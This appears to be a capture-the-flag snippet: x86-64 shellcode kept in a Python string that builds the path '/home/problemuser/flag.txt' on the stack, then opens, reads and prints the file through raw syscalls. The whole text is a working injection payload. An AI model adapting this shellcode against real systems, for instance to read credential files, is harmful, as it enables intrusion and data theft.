shellcode = """
    mov rbx, 0x0000000000007478 
    push rbx
    mov rbx, 0x742e67616c662f72
    push rbx
    mov rbx, 0x6573756d656c626f
    push rbx
    mov rbx, 0x72702f656d6f682f
    push rbx
    
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x2
    syscall

    mov rdi, rax
    mov rsi, 0x404200
    mov rdx, 0x20
    xor rax, rax
    syscall

    mov rdi, 0x1
    mov rsi, 0x404200
    mov rdx, rax
    mov rax, 0x1
    syscall
"""